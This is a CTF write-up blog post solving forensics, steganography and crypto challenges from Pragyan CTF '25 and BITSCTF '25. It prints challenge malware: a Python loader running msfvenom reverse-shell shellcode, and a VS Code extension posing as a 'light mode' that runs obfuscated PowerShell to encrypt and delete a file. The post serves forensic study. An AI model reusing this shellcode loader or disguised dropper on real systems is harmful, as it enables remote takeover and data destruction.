---
title: Pragyan CTF '25 && BITSCTF '25
published: 2025-02-10
description: Pragyan CTF '25 && BITSCTF '25 with BlitzHack
tags: [CTFs, DFIR, Stegnography]
category: CTFs Write-up
draft: false
---

# Pragyan CTF '25 && BITSCTF '25

Welcome back my fellow readers, It has been a very tough weekend for me since there are multiple CTFs running at the same time but I manage to do these 2 CTFs, hope you found what you're looking for in my Write-up

![image](https://hackmd.io/_uploads/rkLnHmPY1e.png)

||Please donate (jk jk jk), I need her S6R1, omfg||

## Pragyan CTF '25


### Size Does Matter

![Screenshot_2](https://hackmd.io/_uploads/rJHt77PK1g.png)

We got a Pcap and an out file, the out file seem like a ELF lets open it in IDA first.

![image](https://hackmd.io/_uploads/ryYFIQDtJe.png)

there a function sending RSA, lets check it out

![image](https://hackmd.io/_uploads/S1QJvXDK1l.png)

seem like this just a normal RSA but got sent through different ip address.

arcoding to the elf file, N is send to 10.0.0.104, e is 192.51.100.22 and c is 51.15.220.32, let's filter them in the pcap file to get the value back.

```
 printf("[INFO] Sending N to %s\n", server_N); // "10.0.0.104"
 printf("[INFO] Sending e to %s\n", server_e); // "198.51.100.22"
 printf("[INFO] Sending c to %s\n", server_c); // "51.15.220.32"
```

![image](https://hackmd.io/_uploads/BJBtPmvFyx.png)

just to be quick here all the value:

```
N: 77479246401894205068886348717755679757625021871831123071777695859921333068162038342336500655426026444039268284249125825890254011888318422295470198903414280509781067046211847789736437062552482362166205659492170258580352747048871852953661335133924658889156288620361043704880227984116253411200216248185395953337
c: 30540923325491170931670320696700424722887386431472787243087186910007305052416716914590558572182229229766453084782356629283693134880309684833601948321368220632894961665922462749959371916041252363740072871988800959117309806520024815510094663225824703154902232651978160124383043281168991030852765264084602476003
e: 47874174163991401414702913982020783747037111812500707722727141542160976848764403110756884380576955335094373622837482550554543632055426752837991192656774393325891771428107454647956015639749036706891412951047721692408364790406930294866263805590009334321567328221016999948033747566405468898843661439914409606809
```

Decrypting the RSA we will get the flag: ```p_ctf{S!z3_d0e5_m@tt3r_f0r_wi3n3Rs}```

### Checkmate

![Screenshot_1](https://hackmd.io/_uploads/By5IYmwF1g.png)

```!
Hint:

1. The enitity visible in some image is related to the challenge Search closely about its relation to chess and different notations

2. 'Pigeon' notation in chess And do try looking up chess encryption
```

The Challange gave us a JPG file that weight up to 4.16mb but the picture was very small

![image](https://hackmd.io/_uploads/r1WZqmwFJg.png)

Using binwalk we can dump out 2 pictures, which one of them is mentioned in the hint as "pigeon"

![image](https://hackmd.io/_uploads/SJ5U5QPY1g.png)

![image](https://hackmd.io/_uploads/BkmD5mvK1g.png)

The picure of a dog defeating magnus carlsen must have something in it since it weight up to 4.2mb and the pigeon mention in the hint seem like wanting us to thinkg of "PGN" (Portable Game Notation) since it all lined up because PiGeon Notaion also "PGN" (my teammate figured this out in the middle of the night lol)

![image](https://hackmd.io/_uploads/SyN4jXwtye.png)

Researching about the chess encryption we manage to find this https://github.com/notnil/chesscode then we got this script

```py!
from time import time
from math import log2
from chess import pgn, Board
from util import get_pgn_games
import sys

def decode(pgn_string: str, output_file_path: str):
    start_time = time()
    total_move_count = 0
    games = get_pgn_games(pgn_string)
    
    with open(output_file_path, "w") as output_file:
        output_file.write("")
    
    output_file = open(output_file_path, "ab")
    output_data = ""
    
    for game in games:
        chess_board = Board()
        game_moves = list(game.mainline_moves())
        total_move_count += len(game_moves)
        
        for move in game_moves:
            legal_move_ucis = [lm.uci() for lm in list(chess_board.generate_legal_moves())]
            move_binary = bin(legal_move_ucis.index(move.uci()))[2:]
            
            max_binary_length = int(log2(len(legal_move_ucis)))
            move_binary = move_binary.zfill(max_binary_length)
            chess_board.push_uci(move.uci())
            output_data += move_binary
            
            if len(output_data) % 8 == 0:
                output_file.write(bytes([int(output_data[i*8:i*8+8], 2) for i in range(len(output_data)//8)]))
                output_data = ""
    
    print(f"Decoded data has been written to {output_file_path}")

def run_decoder():
    if len(sys.argv) != 3:
        print("Usage: python run_decoder.py <input_pgn_file> <output_file>")
        sys.exit(1)
    
    input_pgn_file = sys.argv[1]
    output_file_path = sys.argv[2]
    
    try:
        with open(input_pgn_file, 'r') as f:
            pgn_string = f.read()
        decode(pgn_string, output_file_path)
    except FileNotFoundError:
        print(f"Error: File '{input_pgn_file}' not found.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    run_decoder()
```

using that with the PGN of "the game of the century", if you asked where this come from? it was a string in every image of this challenge

![image](https://hackmd.io/_uploads/H1Cv2QvKkl.png)

Searching google about it we will know it the game between Donald Byrne and 13 yearsold Bobby Fischer, open the game in Lichess scroll down we can get it's PGN

![image](https://hackmd.io/_uploads/r1Tt2QPKyg.png)

```!
[Event "Third Rosenwald Trophy"]
[Site "New York, NY USA"]
[Date "1956.10.17."]
[Round "8"]
[White "Donald Byrne"]
[Black "Bobby Fischer"]
[Result "0-1"]
[WhiteElo "-"]
[WhiteTitle "GM"]
[BlackElo "-"]
[BlackTitle "GM"]
[BlackTeam "America"]
[TimeControl "-"]
[Termination "Normal"]
[Annotator "New York"]
[Variant "Standard"]
[ECO "A15"]
[Opening "English Opening: Anglo-Indian Defense, King's Indian Formation"]
[StudyName "Donald Byrne vs Bobby Fischer"]
[ChapterName "Donald Byrne vs Bobby Fischer"]

1. Nf3 { [%eval 0.17] } 1... Nf6 { [%eval 0.25] } 2. c4 { [%eval 0.0] } 2... g6 { [%eval 0.44] } 3. Nc3 { [%eval 0.25] } 3... Bg7?! { [%eval 0.85] } { Inaccuracy. d5 was best. } (3... d5 4. cxd5 Nxd5 5. h4 Bg7 6. e4 Nxc3 7. dxc3 Qxd1+ 8. Kxd1) 4. d4?! { [%eval 0.0] } { Inaccuracy. e4 was best. } (4. e4 c5 5. d4 cxd4 6. Nxd4 Nc6 7. Be3 Ng4 8. Qxg4 Nxd4) 4... O-O { [%eval 0.29] } 5. Bf4 { [%eval -0.05] } 5... d5 { [%eval 0.13] } 6. Qb3 { [%eval -0.31] } 6... dxc4 { [%eval 0.13] } 7. Qxc4 { [%eval 0.0] } 7... c6 { [%eval 0.4] } 8. e4 { [%eval 0.46] } 8... Nbd7 { [%eval 0.65] } 9. Rd1 { [%eval 0.66] } 9... Nb6 { [%eval 1.12] } 10. Qc5?! { [%eval 0.41] } { Inaccuracy. Qb3 was best. } { [%csl Rc5] } (10. Qb3) 10... Bg4 { [%eval 0.3] } 11. Bg5?? { [%eval -2.56] } { Blunder. Be2 was best. } (11. Be2) 11... Na4 { [%eval -2.67] } 12. Qa3 { [%eval -2.74] } (12. Nxa4 Nxe4 13. Bxe7 (13. Qa3 Nxg5 14. Nxg5 Bxd1 15. Kxd1 Qxd4+ 16. Bd3) 13... Qc7 14. Bxf8 Nxc5 15. Bxc5) 12... Nxc3 { [%eval -2.46] } 13. bxc3 { [%eval -2.65] } 13... Nxe4 { [%eval -2.59] } 14. Bxe7?! { [%eval -3.44] } { Inaccuracy. Be3 was best. } (14. Be3) 14... Qb6?! { [%eval -2.61] } { Inaccuracy. Qd5 was best. } (14... Qd5 15. Bxf8 Bxf8 16. Qb3 Qxb3 17. axb3 Re8 18. Bc4 b5 19. Ne5 Rxe5 20. dxe5 Bxd1 21. Bd3) 15. Bc4 { [%eval -2.67] } 15... Nxc3 { [%eval -2.17] } 16. Bc5 { [%eval -3.06] } 16... Rfe8+ { [%eval -2.73] } 17. Kf1 { [%eval -2.37] } 17... Be6!! { [%eval -2.5] } 18. Bxb6?? { [%eval -7.09] } { Blunder. Qxc3 was best. } (18. Qxc3 Qxc5) 18... Bxc4+ { [%eval -7.01] } 19. Kg1 { [%eval -7.33] } 19... Ne2+ { [%eval -7.23] } 20. Kf1 { [%eval -7.22] } 20... Nxd4+ { [%eval -7.01] } 21. Kg1 { [%eval -7.34] } 21... Ne2+ { [%eval -7.43] } 22. Kf1 { [%eval -7.44] } 22... Nc3+ { [%eval -7.61] } 23. Kg1 { [%eval -7.36] } 23... axb6 { [%eval -7.44] } 24. Qb4 { [%eval -8.01] } 24... Ra4 { [%eval -7.08] } 25. Qxb6 { [%eval -7.06] } 25... Nxd1 { [%eval -7.66] } 26. h3 { [%eval -7.56] } 26... Rxa2 { [%eval -8.01] } 27. Kh2 { [%eval -7.92] } 27... Nxf2 { [%eval -7.9] } 28. Re1 { [%eval -8.19] } 28... Rxe1 { [%eval -8.59] } 29. Qd8+ { [%eval -8.73] } 29... Bf8 { [%eval -8.33] } 30. Nxe1 { [%eval -8.64] } 30... Bd5 { [%eval -8.63] } 31. Nf3 { [%eval -9.04] } 31... Ne4 { [%eval -10.41] } 32. Qb8 { [%eval -13.71] } 32... b5 { [%eval -8.58] } 33. h4 { [%eval -9.02] } 33... h5 { [%eval -10.02] } 34. Ne5 { [%eval -13.4] } 34... Kg7 { [%eval -15.25] } 35. Kg1 { [%eval -59.66] } 35... Bc5+ { [%eval -77.22] } 36. Kf1?! { [%eval #-5] } { Checkmate is now unavoidable. Kh2 was best. } (36. Kh2 Bd6) 36... Ng3+ { [%eval #-4] } 37. Ke1 { [%eval #-4] } 37... Bb4+ { [%eval #-4] } 38. Kd1 { [%eval #-4] } 38... Bb3+ { [%eval #-3] } 39. Kc1 { [%eval #-3] } 39... Ne2+ { [%eval #-2] } 40. Kb1 { [%eval #-2] } 40... Nc3+ { [%eval #-1] } 41. Kc1 { [%eval #-1] } 41... Rc2# 0-1
```

Using the script above, we managed to get the key, converting it to hex and we can dump out all the image in the "image of an dog defeating magnus carlsen"

![image](https://hackmd.io/_uploads/HJmFamPK1g.png)

![image](https://hackmd.io/_uploads/SkV2T7Ptyg.png)

Continue using binwalk with the rly_fin.jpg, we get 64 pictures everyone of them stand for 1 square in the chessboard with the cordinate from a1-h8

![image](https://hackmd.io/_uploads/H1S06QwYJe.png)

Using this script we can build back the Board, it just a normal board but after open in Stegsolve we can see the flag clearly.
```py!
from PIL import Image
import os

image_size = 100 
grid_size = 8  
chessboard = Image.new("RGB", (image_size * grid_size, image_size * grid_size))
for row in range(grid_size):
    for col in range(grid_size):
        file_name = f"{chr(97 + col)}{8 - row}.png"
        if os.path.exists(file_name):
            img = Image.open(file_name).resize((image_size, image_size))
            chessboard.paste(img, (col * image_size, row * image_size))
        else:
            print(f"{file_name} not found")

chessboard.save("chessboard.png")
```

![flag](https://hackmd.io/_uploads/SkCuCQvFJe.png)

Shouting out for $h1kh4r & .vedved for solving this challenge

### Operation CipherLock

![Screenshot_2](https://hackmd.io/_uploads/SkvJfEvYyl.png)

note: I only help in the first part of this challenge, the rest was solved by $h1kh4r

We got a broken pcapng file from the challenge, we can't open it in any way, I tried using https://f00l.de/hacking/pcapfix.php but, I can open it after fixing it up but the result doesn't help much, but string the pcap out I see there some PGP key and there a google drive link

![image](https://hackmd.io/_uploads/HkN8GVPtyl.png)

![image](https://hackmd.io/_uploads/rJjmmEDFJl.png)

![image](https://hackmd.io/_uploads/HyPVmVvYke.png)

there 2 way to get the whole pgp out, first you can use binwalk or just open the pcapng file in notepad, assem all the part we have a fully function google drive link. 

```
https://drive.google.com/drive/folders/1dxvbp6CIyf40oahwtkRBbPzfC6PQkaKi
```

open the link up we will have 2 file, one is the zip and one is the picture

![image](https://hackmd.io/_uploads/BJXoXNDKkx.png)

using John to crack the Bruhh zip, we will get a private key

![image](https://hackmd.io/_uploads/S1BhNNvKkl.png)

Using the private key to decrypt the gpg we will have an audio file

![image](https://hackmd.io/_uploads/rkLjBEvtye.png)

At this point, $h1kh4r know it was rtty so using his script we can get out the message.

```py!
import numpy as np
import scipy.io.wavfile as wav
import scipy.signal as signal

# Parameters
MARK_FREQ = 2125  # Hz (Binary 1)
SPACE_FREQ = 2295  # Hz (Binary 0)
BIT_DURATION = 0.1  # seconds per bit
WINDOW_SIZE = 0.1  # seconds (same as bit duration)

# Load audio file
file_name = "file.wav"
sample_rate, audio_data = wav.read(file_name)

# Ensure audio is mono
if len(audio_data.shape) > 1:
    audio_data = audio_data[:, 0]

# Calculate window size in samples
window_samples = int(sample_rate * WINDOW_SIZE)

# Function to decode FSK
def decode_fsk(audio, sample_rate, mark_freq, space_freq, window_samples):
    decoded_bits = []

    for i in range(0, len(audio), window_samples):
        if i + window_samples > len(audio):
            break

        window = audio[i : i + window_samples]

        # Perform FFT
        fft_result = np.fft.fft(window)
        freqs = np.fft.fftfreq(len(window), d=1/sample_rate)

        # Find dominant frequency
        magnitudes = np.abs(fft_result)
        peak_freq = freqs[np.argmax(magnitudes)]

        # Determine bit based on frequency
        if abs(peak_freq - mark_freq) < abs(peak_freq - space_freq):
            decoded_bits.append("1")
        else:
            decoded_bits.append("0")

    return "".join(decoded_bits)

# Decode signal
bit_string = decode_fsk(audio_data, sample_rate, MARK_FREQ, SPACE_FREQ, window_samples)

# Convert binary string to ASCII text
decoded_text = "".join(chr(int(bit_string[i : i + 8], 2)) for i in range(0, len(bit_string), 8))

print("Decoded Binary:", bit_string)
print("Decoded Text:", decoded_text)
```

![image](https://hackmd.io/_uploads/Hy4784DFJg.png)

```
Ciphertext: 42c74ddaa38b290bd0cae53d79a1b8eca8300ccec20e991cbd67fdd111b2
```

Okay we will leave the ciphertext there and continue with the image.

Arccoding to $h1kh4r, he noticed the name in the challenge so he search about him and know it was [Salsa](https://en.wikipedia.org/wiki/Salsa20) encryption

![image](https://hackmd.io/_uploads/ryGnUNwYye.png)

![image](https://hackmd.io/_uploads/HymTL4PKkl.png)

Also by openning the image in stegsolve again we will know the key:

![image](https://hackmd.io/_uploads/ryHJP4PFyg.png)

```
key: Thetruthishiddenintheshadowshere
```

So the only thing we need left is the nonce, arrcoding to the author, the nonce was in the zip file but he changed it so he just gave it away 

```
Nonce: 3b59ce9e490508e4f37672a7ac71fb0c1c58dc01928120db
```

with all of that using cipherchef we will get the flag:

![image](https://hackmd.io/_uploads/S1k6vVPtye.png)

### Memoria Obscuria

![Screenshot_1](https://hackmd.io/_uploads/rktJO4wF1x.png)

The challenge gave us a memdump file, using volatility searching on the user Desktop we see some suspicious file

![image](https://hackmd.io/_uploads/ry36iVwFJl.png)

script.py, ks.py, protected.zip, seem like these are the thing we need to dump out

Script.py

```py!
import hashlib
import base64
from cryptography.fernet import Fernet

def recreate_key():
    nottheactualkey = "FindMeInTheEnvironment" 
    crypt_key = hashlib.sha256(nottheactualkey.encode('utf-8')).digest()
    crypt_key = base64.urlsafe_b64encode(crypt_key[:32])  
    return crypt_key

def decrypt_data(encrypted_data):
    crypt_key = recreate_key()
    cipher = Fernet(crypt_key)
    
    decrypted_output = cipher.decrypt(encrypted_data.encode('utf-8'))
    return decrypted_output.decode('utf-8')

def main():
    print("I seem to have sent the 'PASSKEY' over the internet")
    encrypted_output = input("Enter the encrypted output: ").strip()
    try:
        decrypted_data = decrypt_data(encrypted_output)
        print("\nDecryption successful!")
        print("Recovered data: ", decrypted_data)
    except Exception as e:
        print("Decryption failed:", str(e))

if __name__ == "__main__":
    main()

```

So this is the key to open the protected zip that the challenge was talking about so the key used to decrypt has been hide in the enviroment and the encrypted key has been sent somewhere.

Using envar plugin inside volatility we can retrieve the key

![image](https://hackmd.io/_uploads/BJS1a4wF1x.png)

So the key is ```Env4rs_1s_4m4z1ng```, also when you looking at the passkey, it seem like they name the virable as "PASSKEY", string the whole find and grep for "PASSKEY" we can see the passkey it sent using invoke-webrequest post method

```ps1!
Invoke-WebRequest -Uri "https://httpbin.org/post" -Method POST -Body (@{PASSKEY="gAAAAABnc46I0KBYbK0bp8FCqJVN--3Ej3k0fOke6MbxKrwFUqg1wvLhY0ks0IcpDJsXHpEbbSLw-gXiK05EW9HGCUYbjYddqArU_cRnlAL8BLW6Noq14HdfZXKDHRaRJ9-p1YPfpXG8nR92Qq-Sv7wSuiJ36kfGxe9DMdi67OvGzNmF3V5KJS1_lezSTlFsCh-DZbNvnT60"} | ConvertTo-Json) -ContentType "application/json" -UseBasicParsing

---

"PASSKEY": "gAAAAABnc46I0KBYbK0bp8FCqJVN--3Ej3k0fOke6MbxKrwFUqg1wvLhY0ks0IcpDJsXHpEbbSLw-gXiK05EW9HGCUYbjYddqArU_cRnlAL8BLW6Noq14HdfZXKDHRaRJ9-p1YPfpXG8nR92Qq-Sv7wSuiJ36kfGxe9DMdi67OvGzNmF3V5KJS1_lezSTlFsCh-DZbNvnT60"
```

from here we can decrypt the data that got encrypted and the result is a google drive link

![image](https://hackmd.io/_uploads/ByZyCVvK1l.png)

open the link we have a gif file with a comment about Capitalize

![image](https://hackmd.io/_uploads/rJoZANvYJx.png)

downloading this gif and using https://ezgif.com/split we can determine that this is morse code 

![image](https://hackmd.io/_uploads/HyrtA4wKye.png)

```
Morsecode: --- .--. . -. - .... .. ... ..-. .. .-.. . ... . ... .- -- .
ASCII: Openthisfilesesame
```
using the password we can extract the zip now, we got another image but using the password we found in ks.py 

Ks.py

```
import ctypes

# The msfvenom-generated shellcode
buf =  b""
buf += b"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52"
buf += b"\x30\x8b\x52\x0c\x8b\x52\x14\x89\xe5\x31\xff\x0f"
buf += b"\xb7\x4a\x26\x8b\x72\x28\x31\xc0\xac\x3c\x61\x7c"
buf += b"\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52"
buf += b"\x8b\x52\x10\x57\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
buf += b"\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x8b\x48\x18"
buf += b"\x01\xd3\x50\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34"
buf += b"\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38"
buf += b"\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58"
buf += b"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
buf += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b"
buf += b"\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12"
buf += b"\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68"
buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8"
buf += b"\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
buf += b"\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x01"
buf += b"\x64\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50"
buf += b"\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97"
buf += b"\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85"
buf += b"\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00"
buf += b"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f"
buf += b"\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68"
buf += b"\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5"
buf += b"\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
buf += b"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00"
buf += b"\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff"
buf += b"\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff"
buf += b"\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff"
buf += b"\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2"
buf += b"\x56\x6a\x00\x53\xff\xd5"

# Embedded password
password = "Password{UGFzc3dvcmR7WTB1X200eV9wYTU1fQ==}"

def print_password():
    print(f"Embedded password: {password}")

# Print the password (optional)
print_password()

# Allocate memory and execute the shellcode
shellcode_len = len(buf)
memory = ctypes.windll.kernel32.VirtualAlloc(0, shellcode_len, 0x1000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(memory, buf, shellcode_len)
ctypes.windll.kernel32.CreateThread(0, 0, memory, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(-1, 0xFFFFFFFF)
```

The password was in base64, debase64 we got "Y0u_m4y_pa55" using this to extract the fin.jpg and we will get the flag

```
base64: UGFzc3dvcmR7WTB1X200eV9wYTU1fQ==
plaintext: Password{Y0u_m4y_pa55}
```

![image](https://hackmd.io/_uploads/H1HcyrwYJl.png)

## BitsCTF '25

### Baby DFIR

![Screenshot_2](https://hackmd.io/_uploads/rk9hlrvYJx.png)

Just open the ad1 file and you will get the flag

![image](https://hackmd.io/_uploads/ryipxSvKJl.png)

### Virus Camp 1 & 2

![Screenshot_1](https://hackmd.io/_uploads/r1L1ZBvYJg.png)

Open the new ad1 file, first thing I saw there was a file that got encrypted

![image](https://hackmd.io/_uploads/ryqXfBPYkl.png)

Wandering around I found a suspicious JScript.

![image](https://hackmd.io/_uploads/rJbKGSDtyg.png)

There was a comment at the end of the script, the flag was also there

```
Base64: VGhlIDFzdCBmbGFnIGlzOiBCSVRTQ1RGe0gwd19jNG5fdlNfYzBkM19sM3RfeTB1X3B1Ymwxc2hfbTRsMWNpb3VzX2V4NzNuc2kwbnNfU09fZWFzaWx5Pz9fNWE3YjMzNmN9
debcase64: BITSCTF{H0w_c4n_vS_c0d3_l3t_y0u_publ1sh_m4l1cious_ex73nsi0ns_SO_easily??_5a7b336c}
```

![Screenshot_2](https://hackmd.io/_uploads/H1BRfBvYyl.png)

The second challenge must be to decrypt the flag

```js!
"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
Object.defineProperty(exports, "__esModule", { value: true });
exports.activate = activate;
exports.deactivate = deactivate;
const vscode = __importStar(require("vscode"));
const child_process_1 = require("child_process");
const fs = __importStar(require("fs"));
function activate(context) {
    const command = vscode.commands.registerCommand("rs", () => {
        const scriptContent = `$wy7qIGPnm36HpvjrL2TMUaRbz = "K0QZjJ3bG1CIlxWaGRXdw5WakASblRXStUmdv1WZSpQDK0QKoU2cvx2Qu0WYlJHdTRXdvRiCNkCKlN3bsNkLtFWZyR3UvRHc5J3YkoQDK0QKos2YvxmQsFmbpZEazVHbG5SbhVmc0N1b0BXeyNGJK0QKoR3ZuVGTuMXZ0lnQulWYsBHJgwCMgwyclRXeC5WahxGckgSZ0lmcX5SbhVmc0N1b0BXeyNGJK0gCNkSZ0lmcXpjOdVGZv1UbhVmc0N1b0BXeyNkL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTtFIsI3b0BXeyNmblRCIs0WYlJHdTRXdvRCKtFWZyR3UvRHc5J3QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5NFI0NWZqJ2TtcXZOBSPg0WYlJHdT9GdwlncjRiCNkSZ0FWZyNkO60VZk9WTlxWaG5yTJ5SblR3c5N1WgwSZslmR0VHc0V3bkgSbhVmc0NVZslmRu8USu0WZ0NXeTBCdjVmai9UL3VmTg0DItFWZyR3U0V3bkoQDK0QKlxWaGRXdw5WakgyclRXeCxGbBRWYlJlO60VZslmRu8USu0WZ0NXeTtFI9AyclRXeC5WahxGckoQDK0QKoI3b0BXeyNmbFVGdhVmcD5yclFGJg0DIy9Gdwlncj5WZkoQDK0wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIn5WakRWYQ5yclFGJK0wQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIlR2bN5yclFGJK0gdpRCI9AiVJ5yclFGJK0QeltGJg0DI5V2SuMXZhRiCNkCKlRXYlJ3Q6oTXzVWQukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIzVWYkoQDK0gIj5WZucWYsZGXcB3b0t2clREXcJXZzVHevJmdcx1cyV2cVxFX6MkIg0DIlxWaGRXdwRXdvRiCNIyZuBnLnFGbmxFXw9GdrNXZExFXyV2c1h3biZHXcNnclNXVcxlODJCI9ASZslmR0VHculGJK0gCNkSZ6l2U2lGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgYXakoQDpUmepNVeltGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgkXZrRiCNkycu9Wa0FmclRXakACL0xWYzRCIsQmcvd3czFGckgyclRXeCVmdpJXZEhTO4IzYmJlL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTBCdjVmai9UL3VmTg0DIzVGd5JUZ2lmclRGJK0gCNAiNxASPgUmepNldpRiCNACIgIzMg0DIlpXaTlXZrRiCNADMwATMg0DIz52bpRXYyVGdpRiCNkCOwgHMscDM4BDL2ADewwSNwgHMsQDM4BDLzADewwiMwgHMsEDM4BDKd11WlRXeCtFI9ACdsF2ckoQDiQmcwc3czRDU0NjcjNzU51kIg0DIkJ3b3N3chBHJ" ;
$9U5RgiwHSYtbsoLuD3Vf6 = $wy7qIGPnm36HpvjrL2TMUaRbz.ToCharArray() ; [array]::Reverse($9U5RgiwHSYtbsoLuD3Vf6) ; -join $9U5RgiwHSYtbsoLuD3Vf6 2>&1> $null ;
$FHG7xpKlVqaDNgu1c2Utw = [systeM.tEXT.ENCODIng]::uTf8.geTStRInG([sYsTeM.CoNVeRt]::FROMBase64StRIng("$9U5RgiwHSYtbsoLuD3Vf6")) ;
$9ozWfHXdm8eIBYru = "InV"+"okE"+"-ex"+"prE"+"SsI"+"ON" ; new-aliaS -Name PwN -ValUe $9ozWfHXdm8eIBYru -fOrce ; pwn $FHG7xpKlVqaDNgu1c2Utw ;`;
        const scriptPath = `C:\\Users\\vboxuser\\AppData\\Local\\Temp\\temp0001`;
        try {
            fs.writeFileSync(scriptPath, scriptContent);
            vscode.window.showInformationMessage(`The light mode will activate in a few minutes.`);
        }
        catch (error) {
            vscode.window.showErrorMessage(`Error activating light mode.`);
        }
        (0, child_process_1.exec)(`powershell.exe -ExecutionPolicy Bypass -File "${scriptPath}"`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
            }
            if (stderr) {
                console.error(`Stderr: ${stderr}`);
            }
            console.log(`Stdout: ${stdout}`);
        });
    });
    context.subscriptions.push(command);
}
// VGhlIDFzdCBmbGFnIGlzOiBCSVRTQ1RGe0gwd19jNG5fdlNfYzBkM19sM3RfeTB1X3B1Ymwxc2hfbTRsMWNpb3VzX2V4NzNuc2kwbnNfU09fZWFzaWx5Pz9fNWE3YjMzNmN9
function deactivate() { }
//# sourceMappingURL=extension.js.map
```

We can see there was a reverse and debase64, I will use cyberchef to analyze the string above

![image](https://hackmd.io/_uploads/ryGYQSPKJe.png)

```
$password = "MyS3cr3tP4ssw0rd"
$salt = [Byte[]](0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08)
$iterations = 10000
$keySize = 32   
$ivSize = 16 

$deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations)
$key = $deriveBytes.GetBytes($keySize)
$iv = $deriveBytes.GetBytes($ivSize)

$inputFile = "C:\\Users\\vboxuser\\Desktop\\flag.png"
$outputFile = "C:\\Users\\vboxuser\\Desktop\\flag.enc"

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = $iv
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

$encryptor = $aes.CreateEncryptor()

$plainBytes = [System.IO.File]::ReadAllBytes($inputFile)

$outStream = New-Object System.IO.FileStream($outputFile, [System.IO.FileMode]::Create)
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($outStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

$cryptoStream.Write($plainBytes, 0, $plainBytes.Length)
$cryptoStream.FlushFinalBlock()

$cryptoStream.Close()
$outStream.Close()

Remove-Item $inputFile -Force
```

So it encrypt the flag using AES then delete itself. Using it own code, we can print out the key and iv it used then using cyberchef and we will get the flag.

```ps!
PS C:\Users\Raviel> $password = "MyS3cr3tP4ssw0rd"
>> $salt = [Byte[]](0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08)
>> $iterations = 10000
>> $keySize = 32
>> $ivSize = 16
>>
>> $deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations)
>> $key = $deriveBytes.GetBytes($keySize)
>> $iv = $deriveBytes.GetBytes($ivSize)
>> $keyHex = ($key | ForEach-Object { $_.ToString("X2") }) -join ""
>> $ivHex = ($iv | ForEach-Object { $_.ToString("X2") }) -join ""
>> Write-Output "Key: $keyHex"
